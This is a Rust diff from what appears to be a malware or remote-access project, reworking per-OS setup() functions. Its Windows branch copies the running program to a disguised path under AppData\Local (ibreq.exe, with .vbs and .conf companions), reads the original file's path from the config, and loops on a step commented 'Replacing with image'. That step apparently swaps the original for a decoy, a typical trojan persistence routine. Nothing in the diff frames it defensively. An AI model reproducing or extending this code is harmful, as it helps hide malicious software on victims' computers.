@@ -157,25 +157,27 @@ impl Connection for TcpStream {
 }
 
 #[cfg(target_os = "macos")]
-pub fn setup() -> Result<()> {
+pub fn setup() {
   todo!();
 }
 
 #[cfg(target_os = "windows")]
-pub fn setup() -> Result<()> {
+pub fn setup() {
   use std::{
     env, fs,
     process::{exit, Command},
+    time::Duration,
+    thread,
   };
-  let home_path = env::home_dir()?.display().to_string();
+  let home_path = env::home_dir().unwrap().display().to_string();
   let current_path = std::env::current_exe().unwrap().display().to_string();
   let target_path = home_path.clone() + "\\AppData\\Local\\ibreq.exe";
   let vbs_path = home_path.clone() + "\\AppData\\Local\\ibreq.vbs";
   let conf_path = home_path.clone() + "\\AppData\\Local\\ibreq.conf";
 
   if current_path == target_path {
-    let conf = parse_config(fs::read_to_string(&conf_path).unwrap());
-    let original_path: String = conf.get("original_path").unwrap();
+    let conf = parse_config(&fs::read_to_string(&conf_path).unwrap());
+    let original_path = conf.get("original_path").unwrap();
 
     loop {
       // Replacing with image;
@@ -213,12 +215,12 @@ pub fn setup() -> Result<()> {
 }
 
 #[cfg(target_os = "linux")]
-pub fn setup() -> Result<()> {
+pub fn setup() {
   todo!();
 }
 
 #[cfg(other)]
-fn setup() -> Result<()> {
+fn setup() {
   todo!();
 }
 
